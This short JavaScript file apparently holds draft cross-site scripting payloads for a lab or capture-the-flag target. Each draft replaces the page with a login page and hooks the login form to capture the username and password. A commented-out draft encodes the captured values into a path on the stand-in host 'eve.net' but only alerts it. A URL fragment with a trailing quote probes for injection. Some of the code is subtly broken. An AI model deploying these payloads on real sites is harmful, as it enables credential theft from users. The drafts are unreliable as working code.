/*(async () => 
  document.write(
    await fetch(`/login.php?url=${encodeURIComponent()}`)
    .then(response => response.text())
    .then(text => text + `
      <script>
        setTimeout(() => {
          $('form[action*=login]').submit(e => {
            a = currentTarget
            alert( '//eve.net/' + btoa(a[0].value) + '/' + btoa(a[1].value))
          })
        }, 4000)
      </script>
    `)
  )
)()*/

///do-question.php?aaid=10972720'

async () => document.write(await fetch('/login.php').then(page => page.text() + `
<script>
  setTimeout(() => $('form[action*=login]').submit(e => {
    e.preventDefault()
    c = e.currentTarget
    alert(c[0].value + c[1].value)
  }), 4000)
</script>
`))()
